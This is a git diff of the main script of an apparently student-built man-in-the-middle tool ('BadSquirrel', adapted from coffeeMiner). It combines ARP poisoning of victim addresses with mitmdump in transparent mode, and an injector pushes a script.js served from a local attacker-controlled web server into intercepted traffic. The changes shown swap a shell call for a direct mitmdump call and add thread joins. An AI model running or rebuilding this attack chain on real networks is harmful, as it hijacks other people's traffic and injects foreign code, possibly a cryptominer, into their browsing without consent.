@@ -6,7 +6,7 @@ from httpServer import webserver
 from ArpSpoof import arp_poison_attack
 
 def main():
-	
+
 	parser = argparse.ArgumentParser(description='ESGI final projet')
 	parser.add_argument('-i', '--interface',help='Interface used for MITM ')
 	parser.add_argument('-f', '--file', help='Path to file contain victime address one pair line')
@@ -32,10 +32,13 @@ def main():
 	# start the http server for serving the script.js, in a new console
 	#os.system("xterm -hold -e 'python3 httpServer.py' &")
 
+	input("Pause, presse enter")
 	# start the mitmproxy
-	injector="/home/simon/Documents/ProjetAnnuel/coffeeMiner-master/injector.py http://10.0.2.10:8000/script.js "
-	#os.system("~/.local/bin/mitmdump -s "+ injector +" -T")
-	os.system("~/.local/bin/mitmdump -s '/home/simon/Documents/ProjetAnnuel/coffeeMiner-master/injector.py http://10.0.2.10:8000/script.js ' --mode transparent")
+
+
+	mitmdump(['-s', '/root/Documents/ESGI/BadSquirrel/injector.py', 'http://192.168.1.10:8000/script.js ', '--mode', 'transparent'])
+	webserver_thread.join()
+	poison_thread.join()
 	webserver_thread._stop()
 	poison_thread._stop()
 	'''
